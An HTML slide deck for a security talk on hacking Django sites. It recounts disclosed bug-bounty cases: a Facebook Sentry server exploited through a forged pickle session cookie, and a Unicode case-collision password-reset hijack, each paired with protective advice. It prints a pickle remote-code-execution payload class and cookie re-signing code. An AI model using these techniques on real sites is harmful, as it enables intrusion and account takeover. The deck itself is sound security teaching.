@@ -1,0 +1,280 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+        <title>How to Hack a Django Website</title>
+
+        <link rel="stylesheet" href="dist/reset.css">
+        <link rel="stylesheet" href="dist/reveal.css">
+        <link rel="stylesheet" href="dist/theme/django.css" id="theme">
+
+        <!-- <link rel="stylesheet" href="css/theme/django.css"> -->
+
+        <!-- Theme used for syntax highlighted code -->
+        <link rel="stylesheet" href="plugin/highlight/monokai.css" id="highlight-theme">
+
+        <!-- Printing and PDF exports -->
+        <script>
+            var link = document.createElement('link');
+            link.rel = 'stylesheet';
+            link.type = 'text/css';
+            link.href = window.location.search.match(/print-pdf/gi) ? 'css/print/pdf.css' : 'css/print/paper.css';
+            document.getElementsByTagName('head')[0].appendChild(link);
+        </script>
+    </head>
+    <body>
+        <div class="reveal">
+            <div class="slides">
+
+<section>
+    <h1>How to Hack a Django Website</h1>
+    <h2>Adam Johnson</h2>
+</section>
+
+<section>
+    <h2>👾 Wh47 15 H4ck1n9?</h2>
+</section>
+
+<section>
+    <h2>👾 What is Hacking?</h2>
+</section>
+
+<section>
+    <h2>👾 What is Hacking?</h2>
+    <ol>
+        <li>👩‍🔬 Playful solving of technical work that requires deep understanding.</li>
+        <li>🦹‍♀️ Unauthorized attempts to bypass the security mechanisms of an information system.</li>
+    </ol>
+</section>
+
+<section>
+    <h2>What is Hacking?</h2>
+    <ol>
+        <li>👩‍🔬 Playful solving of technical work that requires deep understanding.</li>
+        <li><strong>🕵️‍♀️ Unauthorized attempts to bypass the security mechanisms of an information system.</strong></li>
+    </ol>
+</section>
+
+<section>
+    <h2>🍀 Four Stories</h2>
+    <ol>
+        <li class="fragment"><strong>Facebook</strong> - Pickle Remote Code Execution</li>
+        <li class="fragment"><strong>GitHub</strong> - Unicode Downcasing</li>
+        <li class="fragment"><strong>YPlan</strong> - HTML Injection</li>
+        <li class="fragment"><strong>Lotsa Sites</strong> - Javascript Injection</li>
+    </ol>
+</section>
+
+<section>
+    <h2>🤦‍♂️📘 Story 1: Facebook</h2>
+    <p>2018 Blog Post by Blaklis at SCRT, a Swiss infosec company</p>
+    <img class="r-stretch" src="img/scrt-post.png">
+</section>
+
+<section>
+    <h2>🔍 Step 1: Scan Facebook IP range</h2>
+    <img class="r-stretch" src="img/ipinfo-ranges.png">
+</section>
+
+<section>
+    <h2>🎁 Step 2: Find Sentry</h2>
+    <img class="r-stretch" src="img/sentry.jpg">
+</section>
+
+<section>
+    <h2>🐛 Step 3: Browse Sentry</h2>
+    <p>Wow, <code>DEBUG=True</code></p>
+    <img class="r-stretch" src="img/sentry-crash.png">
+</section>
+
+<section>
+    <h2>🤓 Step 4: Read Debugged Settings</h2>
+    <pre><code class="language-python">SESSION_SERIALIZER = "django.&lt;snip&gt;.PickleSerializer"
+SESSION_ENGINE = "django.&lt;snip&gt;.signed_cookies"
+SENTRY_OPTIONS = {
+    ...,
+    "system.secret-key": "some-not-so-secret-key",
+}
+</code></pre>
+</section>
+
+<section>
+    <h2>🍪 Step 5: Replace contents of signed cookie</h2>
+    <pre><code class="language-python">data = django.core.signing.loads(
+    current_cookie,
+    key="some-not-so-secret-key",
+    serializer=PickleSerializer,
+    ...
+)
+data['testcookie'] = PickleRce()
+print(django.core.signing.dumps(
+    data,
+    key="some-not-so-secret-key",
+    serializer=PickleSerializer,
+    ...
+))
+</code></pre>
+</section>
+
+<section>
+    <h2>🚨 PICKLE IS CODE 🚨</h2>
+    <pre><code class="language-python">import os
+
+
+class PickleRce:
+    def __reduce__(self):
+        return os.system, ("sleep 30",)
+</code></pre>
+<pre><code class="language-python" style="white-space: pre-wrap">In [2]: pickle.dumps(PickleRce())
+Out[2]: b'\x80\x04\x95#\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x08sleep 30\x94\x85\x94R\x94.'</code></pre>
+</section>
+
+<section>
+    <h2>💰 Step 6: Bounty</h2>
+
+    <ul>
+        <li>18 hours from report to patch.</li>
+        <li>20 hours to bounty.</li>
+        <li>$5000 reward - lower tier bounty due to no user data at risk.</li>
+    </ul>
+</section>
+
+<section>
+    <h2>🦹‍♀️ How to Hack</h2>
+    <ul>
+        <li>Deliberately 404 to check for <code>DEBUG = True</code>.</li>
+        <li>Look for things using pickle.</li>
+        <li>Build evil pickle payloads.</li>
+    </ul>
+</section>
+
+<section>
+    <h2>🦸‍♀️ How to Protect</h2>
+    <ul>
+        <li><em>Never</em> deploy with <code>DEBUG = True</code>.</li>
+        <li>Run <code>manage.py check --deploy</code>.</li>
+        <li>Avoid pickle - no “safe mode”.</li>
+        <li>Deprecate <code>PickleSerializer</code> (#29708).</li>
+    </ul>
+</section>
+
+<section>
+    <h2>🐙 Story 2 - GitHub</h2>
+    <p>2019 Blog Post by John Gracey</p>
+    <img class="r-stretch" src="img/wisdom-post.jpg">
+</section>
+
+<section>
+    <h2>💥 Step 1 - Find Case Collision</h2>
+    <ul>
+        <li>gıthub -> GITHUB</li>
+        <li>github -> GITHUB</li>
+    </ul>
+    <img class="r-stretch" src="img/unicode.png">
+</section>
+
+<section>
+    <p>All Case Collisions with English:</p>
+
+    <small>
+    <table>
+        <thead>
+            <tr><th>Lowercase</th><th>Uppercase</th></tr>
+        </thead>
+        <tbody>
+            <tr><td>ß</td><td>SS</td></tr>
+            <tr><td>ı</td><td>I</td></tr>
+            <tr><td>ſ</td><td>S</td></tr>
+            <tr><td>ﬀ</td><td>FF</td></tr>
+            <tr><td>ﬁ</td><td>FI</td></tr>
+            <tr><td>ﬂ</td><td>FL</td></tr>
+            <tr><td>ﬃ</td><td>FFI</td></tr>
+            <tr><td>ﬄ</td><td>FFL</td></tr>
+            <tr><td>ﬅ</td><td>ST</td></tr>
+            <tr><td>ﬆ</td><td>ST</td></tr>
+        </tbody>
+    </table>
+    </small>
+</section>
+
+<section>
+    <h2>🖨 Step 2 - Register Domain</h2>
+    <ul>
+        <li>gıthub.com</li>
+        <li>punycode: xn--gthub-n4a.com</li>
+    </p>
+</section>
+
+<section>
+    <h2>📧 Step 3 - Reset Password</h2>
+    <ul>
+        <li>Reset password for john@gıthub.com</li>
+        <li>Receive reset link for john@github.com</li>
+    </ul>
+    <img class="r-stretch" src="img/github-password-reset.png">
+</section>
+
+<section>
+    <h2>🔥 Step 4 - Unleash Chaos</h2>
+    <img class="r-stretch" src="img/github-chaos.png">
+</section>
+
+<section>
+    <h2>😱 django.contrib.auth too!</h2>
+    <p>
+        Fixed in 1.11.27 / 2.2.9 / 3.0.1.
+        Spotted by Simon Charette after reading about Github exploit.
+    </p>
+    <img class="r-stretch" src="img/django-blog-unicode-hijack.png">
+</section>
+
+<section>
+    <h2>🦹‍♀️ How to Hack</h2>
+    <ul>
+        <li>Look for targets with unicode case collisions.</li>
+        <li>Know other unicode features.</li>
+        <li>Detect target site’s Django version.</li>
+    </ul>
+</section>
+
+<section>
+    <h2>🦸‍♀️ How to Protect</h2>
+    <ul>
+        <li>Upgrade Django.</li>
+    </ul>
+</section>
+
+<section>
+    <h1>Thank you! 🤗</h1>
+    <ul>
+        <li>Adam Johnson</li>
+        <li>@adamchainz on GitHub &amp; Twitter</li>
+        <li>me@adamj.eu</li>
+        <li><a href="https://github.com/adamchainz/talk-what-happens-when-you-run-manage.py-test">github.com/adamchainz/talk-what-happens-when-you-run-manage.py-test</a></li>
+    </ul>
+</section>
+
+            </div>
+        </div>
+
+        <script src="dist/reveal.js"></script>
+        <script src="plugin/highlight/highlight.js"></script>
+        <script>
+            // More info about initialization & config:
+            // - https://revealjs.com/initialization/
+            // - https://revealjs.com/config/
+            Reveal.initialize({
+                hash: true,
+
+                controls: false,
+                center: false,
+                progress: false,
+
+                // Learn about plugins: https://revealjs.com/plugins/
+                plugins: [ RevealHighlight ]
+            });
+        </script>
+    </body>
+</html>
